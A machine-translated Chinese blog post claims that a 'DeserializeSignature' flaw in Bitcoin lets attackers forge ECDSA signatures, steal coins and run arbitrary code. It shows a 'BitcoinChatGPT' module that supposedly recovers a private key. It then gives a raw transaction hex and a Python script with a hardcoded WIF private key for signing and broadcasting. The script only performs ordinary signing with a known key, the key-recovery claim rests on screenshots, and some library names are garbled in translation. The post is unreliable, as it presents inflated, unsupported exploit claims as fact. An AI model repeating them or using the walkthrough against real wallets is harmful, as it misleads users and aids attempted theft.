<!-- wp:image {"id":5188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-2-1024x576.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5188"/></figure>
<!-- /wp:image -->

---

# 比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性

---

<!-- wp:paragraph -->
<p>在本研究中，我们将研究 DeserializeSignature 漏洞，该漏洞允许攻击者在比特币网络上创建无效的 ECDSA 签名。在密码学中，ECDSA 数字签名是一种数学方案，可让您证明数字消息或文档的真实性。在比特币网络中，签名用于授权交易，确认一定数量的比特币的所有者确实同意其转移。然而，&nbsp;<a href="https://attacksafe.ru/bip-schnorrrb"><em>2023 年发现的</em></a>该函数中的一个漏洞<code>DeserializeSignature</code>允许攻击者创建可以被网络视为有效的无效签名。<a href="https://attacksafe.ru/bip-schnorrrb"><em></em></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">反序列化签名的工作原理</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature 函数负责将数字签名反序列化（从字节序列转换）为可用于检查其有效性的对象。该函数需要符合比特币中使用的公钥加密标准（ECDSA）的特定数据格式。 DeserializeSignature 函数获取交易签名并检查其与计算结果所获得的哈希值的一致性。如果签名有效，则 DeserializeSignature 返回<code>true</code>，否则返回<code>false</code>。该漏洞的本质是DeserializeSignature在反序列化之前没有检查所有签名参数的正确性。特别是，该函数不检查签名的“R”或“S”值是否为空。这使得攻击者可以创建具有空值的签名，尽管它们无效，但某些比特币客户端可以接受它是正确的。攻击者可以创建一个虚假的交易签名，如果将其传递给包含错误数据的 DeserializeSignature 函数，该签名将被视为有效。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">潜在威胁和攻击示例</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>该漏洞对比特币网络的安全构成了严重威胁。攻击者可以利用它来：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>比特币盗窃：</strong>&nbsp;通过创建无效签名，攻击者可以授权将比特币从他人钱包转移到自己钱包的交易。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>双花：</strong>&nbsp;空值签名可用于使用相同的比特币创建两笔不同的交易。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>操纵区块链中的数据：</strong>攻击者可以创建虚假交易，其签名将被视为正确，并将其添加到区块链中。这可能会导致账户余额发生变化。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>对交易确认系统的攻击：</strong>攻击者可以创建虚假的交易签名并将其发送到网络进行确认。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">反序列化签名流程</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DeserializeSignature 是将字节序列转换为可用于验证交易的数据结构的过程。在比特币的背景下，签名是使用 ECDSA（椭圆曲线数字签名算法）算法创建的，包括两个组成部分：r 和 s。在加密货币的背景下，签名用于确认交易的真实性并确保其完整性。当攻击者可以操纵反序列化过程来更改或伪造签名数据时，就会出现 DeserializeSignature 漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/8E2KJeWu4XA?si=bhCMFNyyxcXGNiTd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">反序列化步骤：</h3>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>读取数据：第一步是读取表示签名的字节序列。该数据通常以 DER（可分辨编码规则）格式存储。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>格式检查：检查字节序列是否符合预期的 DER 格式。这包括检查数据的长度和结构。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>分量提取：从字节序列中提取r和s分量。这些组件是用于验证签名的整数。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>值验证：检查r和s的值是否在可接受的限度内。这对于防止签名伪造攻击很重要。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">潜在的故障点</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>过程可能容易受到各种攻击和错误。让我们看看主要的潜在故障点：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1.格式检查不正确</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果 DER 格式验证未正确执行，可能会导致无效签名被视为有效。这可能允许攻击者伪造签名并进行未经授权的交易。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. 库中的漏洞</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用易受攻击的反序列化库可能会导致各种攻击，例如缓冲区溢出或任意代码执行。使用经过测试和更新的库来处理签名非常重要。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. 值检查不足</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果 r 和 s 值没有得到正确验证，攻击者可能会使用不正确的值来创建伪造的签名。例如，r和s的值必须在1和n-1之间，其中n是椭圆曲线的阶数。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. 运行时攻击</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>某些攻击可以基于对反序列化操作的执行时间的分析。如果执行时间取决于 r 和 s 的值，则攻击者可能会获取有关私钥的信息。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>接下来，我们将研究比特币系统中 DeserializeSignature 过程中的漏洞的研究结果，我们还将研究漏洞背后的机制、潜在后果以及建议的缓解措施。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">对加密货币安全的影响</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>DeserializeSignature</strong>漏洞对加密货币的安全构成严重威胁，原因如下：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>资金损失：攻击者可以利用该漏洞从用户钱包中窃取资金。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>破坏信任：成功的攻击可能会破坏用户对加密货币安全性的信任，对其采用和使用产生负面影响。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>难以检测：利用 DeserializeSignature 漏洞的攻击可能难以检测和预防，因此特别危险。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">防范 DeserializeSignature 漏洞的方法</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>为了防范<strong>DeserializeSignature</strong>漏洞，必须采取以下措施：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>数据验证：在反序列化阶段实施严格的数据检查以防止操纵。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>软件更新：定期更新加密货币系统和钱包，以消除已知漏洞。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>安全审计：定期进行安全审计，以识别和解决潜在的漏洞。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">研究的主要目标</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>漏洞识别：识别 DeserializeSignature 过程中可能容易受到攻击的特定方面。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>漏洞分析：评估已识别漏洞对比特币网络安全的潜在影响。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>审查现有安全方法：检查当前用于保护 DeserializeSignature 流程的方法和方法。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>制定建议：提出提高安全性并防止可能的攻击的措施。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">方法论和漏洞识别</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>比特币中的反序列化签名过程涉及将数据从一种格式转换为另一种格式。在此过程中，可能会出现一些错误，攻击者可以利用这些错误来发起攻击。此阶段的主要任务是识别反序列化过程中的特定漏洞。漏洞密码分析：识别出漏洞后，需要对其进行详细分析。这包括评估对比特币网络安全的潜在影响，以及检查可能的攻击场景。了解攻击者如何利用此漏洞来达到自己的目的非常重要。审查现有的安全方法：本阶段的研究将审查当前用于保护 DeserializeSignature 过程的方法和途径。这将使我们能够确定现有措施的有效性以及哪些措施可以改进。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>为了消除已识别的漏洞，提出了几项措施：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li>更新的反序列化算法：在 DeserializeSignature 阶段实施更严格的检查和数据验证。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>提高测试级别：使用各种攻击场景定期进行安全测试。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>开发人员教育：提高开发人员对可能存在的漏洞以及如何预防这些漏洞的认识。</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>之前的研究已经针对比特币中使用的椭圆曲线数字签名算法（ECDSA）中的漏洞进行了研究。这些研究表明，ECDSA 实施不当可能会导致私钥泄露。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>与DeserializeSignature</strong>漏洞不同，ECDSA 的问题与算法的数学方面有关，而不是与数据处理过程有关。其他研究主要集中在点对点（P2P）比特币网络中的漏洞。这些漏洞包括<strong>双重支出</strong>和<strong>女巫攻击</strong>。与<strong>DeserializeSignature</strong>漏洞不同，这些问题与网络方面和网络上节点的交互有关，而不是与加密数据的处理有关。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>DeserializeSignature 漏洞与之前的研究之间的主要区别在于问题的性质。 DeserializeSignature 漏洞是一个数据处理漏洞，可以通过改进数据反序列化和验证技术来解决。而ECDSA和P2P网络中的漏洞需要对算法和网络协议进行更深层次的改变。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>此外，DeserializeSignature 漏洞对用户安全具有更直接的影响，因为它可用于执行任意代码并危害系统。而 ECDSA 和 P2P 网络中的漏洞可能需要更复杂的攻击并产生更间接的后果。近年来，比特币等加密货币已成为金融生态系统的重要组成部分。然而，随着它们的普及，已识别的漏洞数量也在增加。</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">伪造的 ECDSA 签名</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">使用 BitcoinChatGPT 机器学习过程生成无效的 ECDSA 签名</h3>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>&nbsp;让我们考虑构建使用&nbsp;<strong><a href="https://bitcoinchatgpt.org/deserializesignature-vulnerability-algorithm/" target="_blank" rel="noreferrer noopener">BitcoinChatGPT模块的易受攻击的</a></strong><strong><a href="https://en.bitcoin.it/wiki/Raw_transactions">原始</a></strong>交易的结构&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/i0qchOojI0g?si=uVXaIQiEUrKApLd5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>我们打开Goog​​le Colab版本：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1">https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa#scrollTo=B8ueObMAt5Q9&amp;line=1&amp;uniqifier=1</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
....00
........b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
....0220
........74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
....0141
045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5b
....ffffffff
01
....d204000000000000
........1976
............a914
........d74b32dfa340da479ce64aaf5e326496eb3995f1
....88ac
00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>让我们将所有输出值合并到一根公共线中：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener">让我们打开 BlockCypher 的“解码交易”</a></strong><strong>选项</strong><em>：</em><em>&nbsp;</em><strong><a href="https://live.blockcypher.com/btc/decodetx" target="_blank" rel="noreferrer noopener"></a></strong><em></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5108} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1024x505.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5108"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>解码易受攻击的原始比特币交易后，我们得到结果：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{
    "addresses": &#91;
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "32361b5b8aa2954519c171b45dfa14ee5d997dc0a89182ebea4a9eaa15429f1e",
    "inputs": &#91;
        {
            "addresses": &#91;
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,
            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d"
.......
.......
.......</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>我们关注一下比特币HASH160：&nbsp;&nbsp;</em><strong>d74b32dfa340da479ce64aaf5e326496eb3995f1</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-1.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5112"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31">https://github.com/demining/CryptoDeepTools/blob/f0421962be80403bb1b0877eace2c7eb70eb85bd/32DeserializeSignatureVulnerability/DecodeRawTX.txt#L31</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>HASH</strong></code>BitcoinChatGPT 使用公钥创建交易结构，我们可以看到比特币地址：&nbsp;<a href="https://live.blockcypher.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/" target="_blank" rel="noreferrer noopener">1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a>发送<strong><code>1234 satoshi</code></strong>到其网络内的同一地址。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received">https://live.blockcypher.com/widget/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk/received</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5116} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-2-1024x367.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5116"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>比特币HASH160是使用Python脚本获得的：<a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py" target="_blank" rel="noreferrer noopener"><strong>wif_to_hash160.py</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-3.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5117"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/VulnerableRawTX.txt" target="_blank" rel="noreferrer noopener"><strong>易受攻击的RawTX.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5118} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-4-1024x689.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5118"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/wif_to_hash160.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>问题解答：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5119} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-5-1024x456.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5119"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5120} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-6-1024x351.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5120"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5121} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-7-1024x430.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5121"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-8-1024x275.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5122"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>最终，<strong>BitcoinChatGPT</strong>模块输出对文件的响应：<strong>KEYFOUND.privkey ，以两种最常用的格式</strong><strong>HEX 和 WIF</strong>保存私钥<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5123} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-9-1024x677.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5123"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey">https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://youtu.be/NNFv08QlDZk" target="_blank" rel="noreferrer noopener">BitcoinChatGPT #2 DeserializeSignature 漏洞算法</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/NNFv08QlDZk?si=kzowhQ7vBYKwlViE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:heading -->
<h2 class="wp-block-heading">实用部分</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了继续实际部分，让我们使用<strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener">广播比特币交易</a></strong>存储库从接收到的数据创建一个易受攻击的<strong>原始交易</strong><strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>下载并安装源代码，打开终端并运行命令：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>git clone https://github.com/smartiden/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>目录：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>让我们安装三个重要的库：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://pypi.org/project/zmq/" target="_blank" rel="noreferrer noopener"><strong>兹米克</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/urllib3/" target="_blank" rel="noreferrer noopener"><strong>urllib3</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/requests/" target="_blank" rel="noreferrer noopener"><strong>要求</strong></a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4733,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/04/image-8-1024x495.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-4733"/><figcaption class="wp-element-caption"><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt" target="_blank" rel="noreferrer noopener"><strong>要求.txt</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>让我们运行命令：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pip install -r requirements.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/" target="_blank" rel="noreferrer noopener">让我们在Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>中打开主文件并对 Python 脚本代码进行一些小的更改：<strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener">main.py</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())&#91;'script_pubkey']
tx_in._value = 2345
tx_ins = &#91; tx_in ]
tx_outs = &#91;
    TxOut(1234, Tx.get_address_data(send)&#91;'script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>
